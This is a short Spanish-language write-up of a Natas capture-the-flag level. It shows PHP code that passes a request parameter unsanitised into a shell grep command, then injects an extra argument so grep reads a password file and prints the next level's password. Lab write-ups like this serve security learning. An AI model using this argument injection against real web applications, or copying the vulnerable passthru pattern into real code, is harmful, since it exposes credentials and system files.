Si inspeccionamos el HTML, vemos que es similar al del nivel anterior.
Inspeccionamos el código fuente.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Ya no podemos utilizar `;` para armar un comando que se ejecute, pero podemos
enviar mas de una argumento para que use el primero como patrón, y el segundo
como archivo a leer.

```bash
$ grep -i '' /etc/natas_pass/natas10 dictionary.txt
/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
dictionary.txt:
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
...
```
